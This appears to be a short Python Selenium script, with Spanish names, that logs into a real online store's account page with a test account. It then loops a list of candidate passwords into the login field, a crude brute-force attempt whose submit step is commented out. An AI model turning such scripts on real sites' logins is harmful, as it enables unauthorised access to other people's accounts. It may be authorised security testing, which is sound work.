from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
import time, random, string
from random import seed
from random import randint
seed(27381)
driver = webdriver.Chrome()
passposible = ['contraContra1!','contraContra2!','contraContra3!','contraContra4!','contraContra5!']
passelegida = passposible[4]
#driver.get("https://correotemporal.org/")
driver.get("https://www.google.com")
correo = driver.current_window_handle
correotest = "jada50v_z156s@hxsni.com"
clavetest = "ContraSuperSegura"
driver.execute_script("window.open('https://trulustore.cl/mi-cuenta/','trulu');")
time.sleep(5)
#temp_email = driver.find_element(By.ID, "emailtemporal").get_attribute("value")
driver.switch_to.window("trulu")
inputcorreo = driver.find_element(By.ID,"username")#driver.find_element(By.ID, "reg_email")
inputcorreo.send_keys(correotest)
#print("Correo utilizado: "+temp_email)
inputpass = driver.find_element(By.ID, "password")#driver.find_element(By.ID, "reg_password")
print("Contraseña utilizada: "+passelegida)
inputpass.send_keys(clavetest)
inputpass.send_keys(Keys.ENTER)
time.sleep(40)
driver.find_element_by_partial_link_text("Cerrar sesi").click()
driver.get("https://trulustore.cl/mi-cuenta/)")
inputcorreo = driver.find_element(By.ID,"username")
inputcorreo.send_keys(correotest)
inputbrute = driver.find_element(By.ID,"password")
for x in passposible:
    inputbrute.send_keys(x)
    #inputbrute.send_keys(Keys.ENTER)
    time.sleep(10)

#logout = driver.find_element(By.XPATH, "//a[href*='https://trulustore.cl/mi-cuenta/cerrar-sesion/?_wpnonce=']")
#driver.find_element(By.PARTIAL_LINK_TEXT,"Olvidaste la contra").click()
#olvidaste = driver.find_element(By.ID,"user_login")
#olvidaste.send_keys(correotest)
#olvidaste.send_keys(Keys.ENTER)

#driver.quit()
